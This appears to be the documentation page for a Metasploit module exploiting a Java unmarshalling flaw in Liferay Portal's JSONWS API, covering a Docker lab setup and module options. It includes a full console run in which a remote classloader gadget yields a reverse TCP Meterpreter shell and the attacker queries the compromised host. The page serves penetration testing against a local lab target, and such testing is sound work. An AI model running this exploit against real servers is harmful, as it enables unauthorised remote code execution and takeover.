## Vulnerable Application

### Description

This module exploits a Java unmarshalling vulnerability via JSONWS in
Liferay Portal versions < 6.2.5 GA6, 7.0.6 GA7, 7.1.3 GA4, and 7.2.1
GA2 to execute code as the Liferay user. Tested against 7.2.0 GA1.

### Setup

Install Docker using the [official instructions](https://docs.docker.com/get-docker/).
Follow the instructions for your platform and distribution (if using
Linux). If you're using OS X, you may prefer to `brew cask install docker`
after installing [Homebrew](https://brew.sh/).

**Note:** You may want to increase Docker's memory capacity up to 4 GB.
Liferay will crash at 2 GB or less. 4 GB seems to be the sweet spot.

Run `docker run -it -p 8080:8080 liferay/portal:7.2.0-ga1` (note the
added `7.2.0-ga1` tag) as per Liferay's [Docker Hub instructions](https://hub.docker.com/r/liferay/portal).
Any dependencies will be pulled automatically.

## Verification Steps

Follow [Setup](#setup) and [Scenarios](#scenarios).

## Targets

### 0

This targets Liferay Portal versions < 6.2.5 GA6, 7.0.6 GA7, 7.1.3 GA4,
and 7.2.1 GA2.

## Options

### SRVPORT

If you are testing the [Docker container](#setup), which binds to port
8080 by default, set this to a different port to avoid a port conflict
with the remote classloading server.

## Scenarios

### Liferay Portal 7.2.0 GA1 from [Docker Hub](https://hub.docker.com/r/liferay/portal)

```
msf5 > use exploit/multi/http/liferay_java_unmarshalling
msf5 exploit(multi/http/liferay_java_unmarshalling) > options

Module options (exploit/multi/http/liferay_java_unmarshalling):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      8080             yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       Base path
   VHOST                       no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Liferay Portal < 6.2.5 GA6, 7.0.6 GA7, 7.1.3 GA4, 7.2.1 GA2


msf5 exploit(multi/http/liferay_java_unmarshalling) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf5 exploit(multi/http/liferay_java_unmarshalling) > set lhost 192.168.1.3
lhost => 192.168.1.3
msf5 exploit(multi/http/liferay_java_unmarshalling) > set srvport 8888
srvport => 8888
msf5 exploit(multi/http/liferay_java_unmarshalling) > run

[*] Started reverse TCP handler on 192.168.1.3:4444
[*] Executing automatic check (disable AutoCheck to override)
[+] The target appears to be vulnerable. Liferay 7.2.0 CE GA1 MAY be a vulnerable version. Please verify.
[*] Using URL: http://0.0.0.0:8888/
[*] Local IP: http://192.168.1.3:8888/
[+] Started remote classloader server at http://192.168.1.3:8888/
[*] Sending remote classloader gadget to http://127.0.0.1:8080/api/jsonws/expandocolumn/update-column
[*] GET /Uphxohekruuokpedknflsriuafhrdsfk.class requested
[+] Sending constructor class
[*] GET /metasploit/Payload.class requested
[+] Sending payload class
[*] HEAD /metasploit.dat requested
[+] Sending 200
[*] GET /metasploit.dat requested
[+] Sending payload config
[*] HEAD /metasploit/Payload.class requested
[+] Sending 200
[*] GET /metasploit/Payload.class requested
[+] Sending payload class
[*] Sending stage (53928 bytes) to 192.168.1.3
[*] Meterpreter session 1 opened (192.168.1.3:4444 -> 192.168.1.3:58271) at 2020-04-08 07:05:47 -0500
[*] Server stopped.

meterpreter > getuid
Server username: liferay
meterpreter > sysinfo
Computer    : 588a96d744cb
OS          : Linux 4.19.76-linuxkit (amd64)
Meterpreter : java/linux
meterpreter >
```
